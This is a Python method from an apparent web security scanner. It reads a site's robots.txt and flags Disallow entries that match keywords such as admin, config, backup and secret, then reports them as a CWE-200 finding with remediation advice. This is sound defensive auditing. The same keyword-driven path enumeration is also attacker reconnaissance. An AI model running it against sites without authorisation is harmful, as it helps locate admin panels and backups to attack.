    # ── 11. robots.txt analysis ────────────────────────────────────────────

    def _check_robots(self, result: ScanResult):
        r = self._get("/robots.txt")
        if not r or r.status_code != 200:
            return
        content = r.text

        # Look for interesting disallowed paths
        interesting = re.findall(r"Disallow:\s*(/[^\s]+)", content, re.IGNORECASE)
        interesting = [p for p in interesting if any(
            kw in p.lower() for kw in ["admin", "api", "config", "backup", "private", "internal", "secret", "manage", "upload"]
        )]

        if interesting:
            result.findings.append(Finding(
                title="robots.txt Reveals Sensitive Paths",
                severity=Severity.LOW,
                category=Category.LOGGING,
                file_path=f"{self.base_url}/robots.txt",
                line_number=None,
                code_snippet="Disallow: " + "\nDisallow: ".join(interesting[:10]),
                description=(
                    "robots.txt contains Disallow entries for sensitive paths. "
                    "These paths are public knowledge — attackers specifically check robots.txt for hidden endpoints."
                ),
                recommendation=(
                    "Don't rely on robots.txt for security. Use proper authentication and authorization on all sensitive paths. "
                    "Consider using a generic wildcard Disallow: / if you don't need search indexing."
                ),
                cwe_id="CWE-200",
                root_cause="robots.txt used incorrectly as access control rather than just search engine guidance.",
                consequences="Attackers enumerate admin panels, API endpoints, and backup locations directly from robots.txt.",
            ))
